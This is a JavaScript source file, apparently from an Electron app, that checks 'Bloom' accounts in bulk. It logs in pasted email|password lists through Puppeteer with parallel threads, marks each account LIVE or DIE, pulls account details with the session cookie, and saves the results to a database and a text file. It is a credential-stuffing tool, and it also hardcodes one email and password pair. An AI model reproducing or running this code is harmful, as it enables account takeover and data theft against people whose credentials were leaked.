const puppeteer = require('puppeteer');
const bloomLoginHelper = require('../helper/bloom/bloomLogin');
const utilsHelper = require('../helper/utils');
const process = require('process');
const randomUserAgent = require('random-user-agent');
const os = require('os');
const fs = require('fs');
process.setMaxListeners(0)

const Datastore = require('nedb')
const checkLoginBloomDB = new Datastore({
    filename: 'database/checkLoginBloom.db',
    autoload: true
});



let dataLogin = {
    email: "buckyp31@aol.com",
    password: "bigboy69",
}



const autoSave = () => {

    checkLoginBloomDB.find({},(err, docs) => {
        let output = '';
        docs.forEach(element => {
            output += element.output + "\n";
        });
        
        let stream = fs.createWriteStream("bloomLogin.txt");

        stream.once('open', function (fd) {
            stream.write(output);
            stream.end();
        });
    })
}
autoSave()

setInterval(autoSave, 10000);


window.onload = () => {

    checkLoginBloomDB.find({},(err, docs) => {
        let listOuputRestore = '#listOuputRestore';
        docs.forEach(element => {
            $(listOuputRestore).append(element.output + "\n");
        });
    })


    document.querySelector('#btnStart').addEventListener('click', async () => {
        $(proccessingCurrent).text(0);

        let buttonElement = '#btnStart';
        let buttonDefaultText = $(buttonElement).text();

        $(buttonElement).html('<i class="fa fa-spinner fa-spin" style="font-size:20px"></i> Proccessing..');
        $(buttonElement).prop("disabled", true);

        let elementOutput = "#listOuput";
        let elementproccessingAll = "#proccessingAll";
        let elementproccessingCurrent = "#proccessingCurrent";

        let theard = Number($("#theardCount").val())

        let showBrowser = $('#checkboxShowBrowser').is(":checked");
        if (showBrowser) showBrowser = false
        else showBrowser = true

        let listInput = $("#listInputMain").val().trim().replace(/^\s*\n/gm, "").split('\n');

        $(elementOutput).text('');
        $(elementproccessingCurrent).text(0);
        $(elementproccessingAll).text(listInput.length);

        let accountCount = 0;

        for (let index = 0; index < listInput.length / (theard); index++) {

            let promiseLoginAll = []

            for (let i = 1; i <= theard; i++) {

                let actionAfterCheck = (dataLogin,resultCheck) => {
                    let buildOutput = "";
                    if (resultCheck)
                        buildOutput = bloomLoginHelper.parseDataBloomCheck(resultCheck)
                    let outputFinal = [
                        Object.values(dataLogin).join(' | '),
                        buildOutput,
                    ].join(' | ')

                    $(elementOutput).append(outputFinal + "\n");

                    checkLoginBloomDB.insert({
                        ...dataLogin,
                        fullDeTail : resultCheck,
                        output : outputFinal,
                    });

                    $(proccessingCurrent).text(Number($(elementproccessingCurrent).text()) + 1);

                }

                let dataLogin
                let dataLoginSaved

                if (await listInput[accountCount]) {
                    let dataLoginExtract = listInput[accountCount].split("|");
                    dataLogin = {
                        email: dataLoginExtract[0].trim(),
                        password: dataLoginExtract[1].trim(),
                    }

                    
                    let dataLoginSaved = await new Promise((resolve, reject) => {
                        checkLoginBloomDB.find({
                            email: dataLogin.email
                        },(err, doc) => {
                            resolve(doc)
                        });
                    });

                    if (await dataLoginSaved[0]) {
                        $(elementOutput).append(dataLoginSaved[0].output + "\n");
                        $(proccessingCurrent).text(Number($(elementproccessingCurrent).text()) + 1);
                        dataLogin = null
                    }
                    
                    await accountCount++
                }
                

                if (await dataLogin) {
                   let promiseLogin =  bloomLoginHelper.bloomLogin(dataLogin,showBrowser).then(resultLogin => {
                       let status = 'DIE'
                        let outputFinal = {
                            status,
                            ...dataLogin
                        }
                        
                        if (resultLogin.loginSuccess) {
                            bloomLoginHelper.checkTotalInfo(resultLogin.cookie).then(resultCheck=>{
                                outputFinal.status = 'LIVE';
                                actionAfterCheck(outputFinal,resultCheck)

                            })
                        } else {
                            actionAfterCheck(outputFinal,[])
                        }
                    })

                    promiseLoginAll.push(promiseLogin);
                }

            }
            if (promiseLoginAll.length > 0)
                await Promise.all(promiseLoginAll);

        }

        $(buttonElement).removeAttr('disabled');
        $(buttonElement).hide().text(buttonDefaultText).fadeIn();

    })
};